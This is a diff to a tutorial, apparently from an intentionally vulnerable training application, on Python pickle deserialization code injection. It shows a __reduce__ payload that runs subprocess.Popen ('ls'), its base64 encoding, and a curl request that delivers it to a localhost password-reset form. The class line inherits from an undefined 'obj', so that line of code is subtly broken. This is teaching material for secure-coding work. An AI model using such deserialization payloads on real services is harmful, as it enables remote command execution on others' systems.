@@ -1,7 +1,9 @@
-**Description**: Code Injection is an attack type in the application executes untrusted injected code. These attacks are usually a result of improper input/output data validation. In this case we will explore Python's pickle library which "is not secure against erroneous or maliciously constructed data."
+**Description**:  Code Injection is an attack type in the application executes untrusted injected code.
+These attacks are usually a result of improper input/output data validation.
+ In this case we will explore Python's pickle library which "is not secure against erroneous or maliciously constructed data."
 
-
-**Why**: Typically object serialization is used as a way to quickly compress an object into a byte stream. This is useful for easily storing objects  or even transferring objects efficiently through different parts of a program.
+**Why**: Typically object serialization is used as a way to quickly compress an object into a byte stream.
+This is useful for easily storing objects or even transferring objects efficiently through different parts of a program.
 
 Let's look at the code.
 
@@ -82,8 +84,11 @@ This attach is slightly complicated and requires a decent amount of setup. But i
 >>> import pickle
 >>> import base64
 >>> import subprocess
->>> print base64.b64encode(pickle.dumps((subprocess.Popen, (('ls',),))))
-KGNzdWJwcm9jZXNzClBvcGVuCnAwCigoUydscycKcDEKdHAyCnRwMwp0cDQKLg==
+>>> class GenProcess(obj):
+        def __reduce__(self):
+            return (subprocess.Popen, (('ls',),))
+>>> print base64.b64encode(pickle.dumps(GenProcess()))
+Y3N1YnByb2Nlc3MKUG9wZW4KcDAKKChTJ2xzJwpwMQp0cDIKdHAzClJwNAou
 ```
 We just serialized subprocesss method that runs the 'ls' command on our terminal.
 
@@ -93,12 +98,12 @@ Now we'll put together or curl request. It will be in the form
 curl -H 'Cookie:   csrftoken=<csrf_token>' --data "user=<encoded_object>=&password=password1&confirm_password=password1&csrfmiddlewaretoken=<middleware_token>" http://localhost:8000/password_resets/
 ```
 
-To get the crsf token fillout the password reset form and get the link. Then make this curl request
+To get the crsf token fill out the password reset form and get the link. Then make this curl request
 
 ```
 curl -i localhost:8000/password_resets/?token=2-e1ee0df341f342553a75351cf5e13b31
 ```
-Scrolling to the top you will see the csrf_token. And right next to the form tag you will see the csrfmiddlewaretoken value. Now for encoded_object parameter put in the output of print base64.b64encode(pickle.dumps((subprocess.Popen, (('ls',),)))). When you send the request you should see the ls command executed!
+Scrolling to the top you will see the csrf_token. And right next to <form> tag you will see the csrfmiddlewaretoken value. Now for encoded_object parameter put in the output of the python shell. When you send the request you should see the ls command executed!
 
 **The Solution:**
 
